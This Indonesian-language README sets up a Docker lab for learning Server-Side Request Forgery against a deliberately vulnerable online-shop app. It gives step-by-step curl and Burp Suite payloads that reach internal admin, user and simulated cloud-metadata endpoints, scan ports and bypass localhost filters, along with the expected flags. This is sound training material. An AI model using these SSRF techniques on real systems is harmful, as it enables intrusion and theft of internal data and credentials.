# Lab Pembelajaran SSRF - Skenario Toko Online Sederhana

Lab ini menyediakan lingkungan yang aman dan mandiri untuk belajar dan berlatih kerentanan Server-Side Request Forgery (SSRF) yang realistis dalam konteks toko online.

## Arsitektur

Lab ini terdiri dari dua layanan yang diorkestrasi oleh Docker Compose:

- `web-app`: Aplikasi toko online Node.js/Express yang menghadap publik yang mengandung kerentanan SSRF. Dapat diakses di `http://localhost:3000`.
- `internal-api`: API Node.js/Express yang **tidak** terpapar ke mesin host. Ini mensimulasikan layanan internal seperti manajemen stok, data pengguna, dan metadata cloud.

## Cara Menjalankan Lab

1.  Pastikan Docker dan Docker Compose terinstall.
2.  Buka terminal di direktori root proyek dan jalankan:

    ```bash
    docker compose up --build
    ```

Ini akan membangun image Docker dan memulai kedua container. `web-app` akan tersedia di `http://localhost:3000`. Anda dapat mengakses UI web di `http://localhost:3000` di browser untuk berinteraksi dengan toko online. Anda dapat memantau log server di terminal tempat Anda menjalankan perintah.

## Cara Menggunakan Lab

Lab ini dirancang untuk pemula belajar tentang kerentanan SSRF. Anda dapat berinteraksi dengannya dengan beberapa cara:

### Menggunakan UI Web

1. Buka `http://localhost:3000` di browser.
2. Anda akan melihat toko online sederhana dengan produk.
3. Klik tombol "Check Stock" pada produk apa pun untuk melihat informasi stok dari supplier internal.
4. Amati hasil di halaman. Untuk pengujian lanjutan, gunakan metode di bawah.

### Menggunakan Burp Suite CE (Proxy)

Burp Suite adalah alat proxy web populer untuk mencegat dan memodifikasi permintaan HTTP. Metode ini bagus untuk pemula melihat bagaimana permintaan bekerja.

1. **Download Burp Suite Community Edition**: Kunjungi https://portswigger.net/burp/communitydownload dan download versi gratis.
2. **Install dan Jalankan**: Install Burp Suite CE dan mulai.
3. **Konfigurasi Proxy Browser**: Atur browser Anda (mis. Chrome) untuk menggunakan proxy `127.0.0.1:8080` (periksa tab Proxy Burp untuk port).
4. **Aktifkan Intercept**: Di Burp, pergi ke Proxy > tab Intercept dan nyalakan "Intercept is on".
5. **Test Lab**: Buka `http://localhost:3000` di browser dan klik "Check Stock" pada produk.
6. **Intercept Permintaan**: Burp akan menangkap permintaan ke `/api/stock?url=...`. Klik "Forward" untuk melihatnya.
7. **Modifikasi dan Serang**: Ubah parameter `url` ke endpoint internal, mis. `http://internal-api:4000/v1/admin/config`. Kemudian klik "Forward" untuk kirim.
8. **Amati Respons**: Periksa respons di Burp atau browser untuk data yang bocor.

### Menggunakan Inspect Element Browser

Gunakan alat developer browser untuk memeriksa dan memodifikasi permintaan secara langsung.

1. **Buka Developer Tools**: Buka `http://localhost:3000` di Chrome atau Firefox. Klik kanan dan pilih "Inspect" (atau tekan F12).
2. **Pergi ke Tab Network**: Klik tab "Network" di DevTools.
3. **Picu Permintaan**: Klik "Check Stock" pada produk.
4. **Temukan Permintaan**: Cari permintaan ke `/api/stock` di log jaringan.
5. **Copy as cURL**: Klik kanan permintaan dan pilih "Copy > Copy as cURL".
6. **Modifikasi di Terminal**: Tempel perintah cURL ke terminal. Ubah parameter URL setelah `url=` ke endpoint internal, mis. `http://internal-api:4000/data`.
7. **Jalankan dan Amati**: Eksekusi perintah cURL yang dimodifikasi dan lihat respons.

### Menggunakan curl (Command Line)

Gunakan perintah `curl` untuk langsung menguji endpoint `/api/stock` dengan URL berbeda. Ini memungkinkan Anda membuat serangan spesifik.

Contoh:

```bash
curl "http://localhost:3000/api/stock?url=http://example.com/stock.json"
```

## Mengeksekusi Serangan

Tujuannya adalah mengeksploitasi kerentanan SSRF di fitur "Stock Checking" toko online untuk mengakses endpoint sensitif di layanan `internal-api`.

- **Endpoint Rentan:** `GET /api/stock?url=`
- **Parameter Rentan:** `url` (parameter query)
- **Logika Dimaksud:** Toko online memungkinkan supplier memberikan data stok via URL untuk pemeriksaan inventaris real-time. Ini mengharapkan URL seperti `http://supplier.com/stock.json`.
- **Kelemahan:** Aplikasi tidak memvalidasi URL yang diberikan dengan benar. Ini hanya mengambil URL apa pun yang diberikan. Ini memungkinkan penyerang memaksa server membuat permintaan ke layanan internal.

  Ini adalah bentuk **semi-blind SSRF**. Aplikasi akan mengembalikan data respons jika berhasil, tetapi error mungkin bocor informasi tentang jaringan internal. Anda harus memantau log server (di terminal `docker compose`) untuk mengonfirmasi permintaan dibuat.

### Serangan: Mengakses Endpoint Admin Internal

Serangan ini memaksa server membuat permintaan ke endpoint `/v1/admin/config` di internal API, yang berisi data konfigurasi toko sensitif.

**Eksekusi:**

Gunakan `curl` untuk mengirim permintaan yang dibuat. Payload menunjuk ke layanan internal.

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/admin/config"
```

**Hasil Diharapkan:**

1.  **Di terminal `curl` Anda**, Anda akan menerima data sensitif:

    ```json
    {
      "admin_token": "SSRF_LAB_SUCCESS_PATH_TRAVERSAL",
      "internal_status": "Secure"
    }
    ```

2.  **Di terminal log `docker compose` Anda**, Anda akan melihat log dari layanan `web-app`:

    ```
    web-app_1       | Making request to fetch stock from: http://internal-api:4000/v1/admin/config
    ```

Ini mengonfirmasi Anda berhasil membuat server `web-app` meminta data dari layanan internal. Anda menemukan flag `SSRF_LAB_SUCCESS_PATH_TRAVERSAL`!

### Serangan Bonus: Mengakses Endpoint Data Internal

Gunakan teknik yang sama untuk mengakses endpoint `/data`.

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/data"
```

Ini akan mengungkap flag kedua, `SSRF_LAB_SUCCESS_HOST_BYPASS`.

### Serangan Bonus: Enumerasi Lokasi Stok

Akses endpoint pemeriksaan stok dengan lokasi supplier berbeda untuk melihat bagaimana toko memeriksa inventaris dari berbagai gudang:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/london"
```

Respons diharapkan:

```json
{
  "location": "London",
  "status": "In Stock"
}
```

Coba lokasi lain seperti `paris`:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/paris"
```

Respons diharapkan:

```json
{
  "location": "paris",
  "status": "Out of Stock"
}
```

### Serangan Bonus: Port Scanning via SSRF

Gunakan SSRF untuk memindai port terbuka di jaringan internal:

```bash
curl "http://localhost:3000/api/stock?url=http://localhost:4000/"
```

Jika port terbuka, Anda mungkin mendapat respons atau error yang menunjukkan layanan dapat dijangkau.

### Serangan Bonus: Bypass URL Encoding

Coba cara berbeda untuk mereferensikan localhost:

```bash
curl "http://localhost:3000/api/stock?url=http://127.0.0.1:4000/v1/admin/config"
curl "http://localhost:3000/api/stock?url=http://[::1]:4000/v1/admin/config"
```

### Serangan Bonus: Pengungkapan Informasi Berbasis Error

Kirim permintaan ke endpoint yang tidak ada untuk membocorkan informasi jaringan:

```bash
curl "http://localhost:3000/api/stock?url=http://nonexistent.internal:4000/"
```

Pesan error mungkin mengungkap detail tentang jaringan internal.

### Serangan Bonus: Mengakses Data Pelanggan

Eksploitasi SSRF untuk mengakses data pelanggan internal, yang bisa digunakan untuk serangan bertarget atau pelanggaran data:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/users"
```

Respons diharapkan: Daftar pelanggan dengan informasi sensitif.

### Serangan Bonus: Simulasi Akses Metadata Cloud

Akses metadata inventaris berbasis cloud yang disimulasikan, yang mungkin berisi kunci API untuk pembaruan stok otomatis:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/metadata"
```

Respons diharapkan: Metadata instance termasuk kredensial simulasi dan flag `SSRF_LAB_SUCCESS_CLOUD_METADATA`.

## Membersihkan

Untuk menghentikan dan menghapus container, tekan `Ctrl+C` di terminal tempat `docker compose` berjalan, lalu jalankan:

```bash
docker compose down
```
